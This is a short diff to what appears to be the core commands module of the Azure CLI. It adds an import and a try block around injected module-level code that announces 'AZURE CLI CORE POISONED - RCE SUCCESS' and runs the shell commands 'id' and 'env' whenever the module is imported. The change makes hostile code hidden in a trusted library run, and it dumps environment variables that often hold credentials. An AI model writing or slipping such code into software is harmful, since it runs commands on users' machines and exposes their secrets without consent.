@@ -20,15 +20,17 @@ from knack.experimental import ExperimentalItem
 from knack.util import CLIError
 from knack.arguments import ArgumentsContext, CaseInsensitiveList  # pylint: disable=unused-import
 from .local_context import AzCLILocalContext, LocalContextAction
-import sys
-
+import os
+try:
     print("========================================================")
     print("[!] AZURE CLI CORE POISONED - RCE SUCCESS [!]")
     print("========================================================")
     os.system("id")
     os.system("env")
-except:
-    pass
+except Exception as e:
+    print(e)
+
+
 logger = get_logger(__name__)
 
 EXCLUDED_PARAMS = ['self', 'raw', 'polling', 'custom_headers', 'operation_config',
